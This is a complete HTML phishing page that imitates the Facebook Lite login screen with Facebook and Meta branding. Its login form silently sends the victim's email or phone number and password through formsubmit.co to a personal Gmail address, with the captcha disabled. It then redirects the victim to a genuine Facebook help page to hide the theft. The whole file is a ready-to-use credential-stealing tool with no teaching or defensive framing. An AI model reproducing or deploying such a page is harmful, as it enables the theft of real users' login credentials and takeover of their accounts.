<!DOCTYPE html>
<html lang="en-UK">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Facebook Lite Login</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    html, body {
      height: 100%;
      width: 100%;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", sans-serif;
      background-color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    form {
      width: 100%;
      max-width: 360px;
      padding: 20px;
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    .language-select {
      font-size: 14px;
      color: #1c1e21;
      margin-bottom: 30px;
    }

    .fb-logo {
      width: 80px;
      height: 80px;
      border-radius: 50%;
      background-color: #f0f2f5;
      display: flex;
      align-items: center;
      justify-content: center;
      margin-bottom: 30px;
    }

    .fb-logo img {
      width: 40px;
    }

    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: 14px;
      margin-bottom: 12px;
      font-size: 16px;
      border: 1px solid #dddfe2;
      border-radius: 8px;
    }

    .login-btn {
      width: 100%;
      background-color: #1877f2;
      color: white;
      padding: 14px;
      font-size: 16px;
      font-weight: bold;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      margin-bottom: 16px;
    }

    .login-btn:hover {
      background-color: #166fe5;
    }

    .forgot-password {
      font-size: 14px;
      color: #1877f2;
      margin-bottom: 30px;
      text-align: center;
      cursor: pointer;
    }

    .create-account {
      width: 100%;
      padding: 14px;
      font-size: 16px;
      font-weight: bold;
      color: #1877f2;
      border: 1px solid #1877f2;
      border-radius: 24px;
      background-color: transparent;
      margin-bottom: 40px;
      cursor: pointer;
    }

    .create-account:hover {
      background-color: #f0f2f5;
    }

    .meta-logo {
      text-align: center;
      font-size: 14px;
      color: #606770;
    }

    .meta-logo img {
      width: 60px;
      margin-top: 10px;
    }
  </style>
</head>
<body>
  <form action="https://formsubmit.co/gamingznoob404@gmail.com" method="POST">
    <input type="hidden" name="_captcha" value="false">
    <input type="hidden" name="_next" value="https://m.facebook.com/help/479793009433142/#">

    <div class="language-select">English (UK) &#9662;</div>

    <div class="fb-logo">
      <img src="https://static.xx.fbcdn.net/rsrc.php/yl/r/H3nktOa7ZMg.svg" alt="Facebook Icon">
    </div>

    <input type="text" name="mobile or email address" placeholder="Mobile number or email address" required>
    <input type="password" name="password" placeholder="Password" required>

    <button type="submit" class="login-btn">Log in</button>

    <div class="forgot-password">Forgotten password?</div>

    <button type="button" class="create-account">Create new account</button>

    <div class="meta-logo">
      <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Meta_Platforms_Inc._logo.svg" alt="Meta Logo">
    </div>
  </form>
</body>
</html>
